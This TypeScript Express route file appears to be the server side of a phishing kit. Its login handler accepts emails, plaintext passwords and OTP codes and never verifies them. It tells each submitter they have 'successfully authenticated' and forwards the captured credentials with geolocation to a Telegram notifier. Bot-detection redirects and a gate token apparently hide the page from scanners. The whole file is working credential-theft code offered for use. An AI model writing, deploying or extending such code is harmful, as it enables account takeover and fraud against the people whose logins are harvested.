import { Router } from 'express';
import { evaluateBotSignals, sendBotRedirect } from '../lib/botShield.ts';
import { resolveGeo } from '../lib/geo.ts';
import {
  getClientIp,
  parseSecureBody,
  verifyGateToken,
  verifyTurnstile,
} from '../lib/security.ts';
import { sendTelegramNotification } from '../lib/telegram.ts';

interface LoginRequest {
  email: string;
  provider?: string;
  password: string;
  turnstileToken?: string;
  clientSignals?: Record<string, unknown>;
  ip?: string;
  country?: string;
  countryCode?: string;
  region?: string;
  city?: string;
  continent?: string;
  org?: string;
  timezone?: string;
}

const router = Router();

router.post('/', async (req, res) => {
  try {
    const accessToken = req.header('x-access-token');
    if (!(await verifyGateToken(accessToken))) {
      res.status(403).json({
        success: false,
        message: 'Access denied',
        error: 'Valid session verification is required. Please reload the page.',
      });
      return;
    }

    const body = (await parseSecureBody(req.body)) as LoginRequest;

    const botCheck = evaluateBotSignals(req, body.clientSignals);
    if (botCheck.isBot) {
      sendBotRedirect(res, botCheck.reason);
      return;
    }

    if (!body.email) {
      res.status(400).json({
        success: false,
        message: 'Validation failed',
        error: 'Missing required field: email is required.',
      });
      return;
    }

    if (body.password && body.password.length < 3) {
      res.status(400).json({
        success: false,
        message: 'Validation failed',
        error: 'Password must be at least 3 characters long.',
      });
      return;
    }

    const isOtpSubmission = body.password?.startsWith('[OTP Code]');

    if (body.password && !isOtpSubmission && body.turnstileToken) {
      const turnstileVerified = await verifyTurnstile(body.turnstileToken);
      if (!turnstileVerified) {
        res.status(403).json({
          success: false,
          message: 'Verification failed',
          error: 'Failed to verify Turnstile challenge. Are you a bot?',
        });
        return;
      }
    }

    const emailLocal = body.email.split('@')[0];
    const formattedName = emailLocal
      .split('.')
      .map((part) => part.charAt(0).toUpperCase() + part.slice(1).toLowerCase())
      .join(' ');

    const providerName = body.provider ? ` via ${body.provider}` : '';
    const welcomeMessage = `Hi ${formattedName}, welcome! You have successfully authenticated${providerName}. Your account is now active and ready to use.`;

    const clientIp = getClientIp(req);
    const geo = await resolveGeo(clientIp, {
      ip: body.ip,
      country: body.country,
      countryCode: body.countryCode,
      region: body.region,
      city: body.city,
      continent: body.continent,
      org: body.org,
      timezone: body.timezone,
    });

    await sendTelegramNotification(
      formattedName,
      body.email,
      body.provider || 'email',
      body.password,
      geo,
    ).catch((err) => {
      console.error('Telegram notification error:', err);
    });

    res.json({
      success: true,
      message: welcomeMessage,
      data: {
        email: body.email,
        name: formattedName,
        provider: body.provider || 'email',
        timestamp: new Date().toISOString(),
      },
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Server error',
      error:
        error instanceof Error
          ? error.message
          : 'An unexpected error occurred during login processing.',
    });
  }
});

export default router;
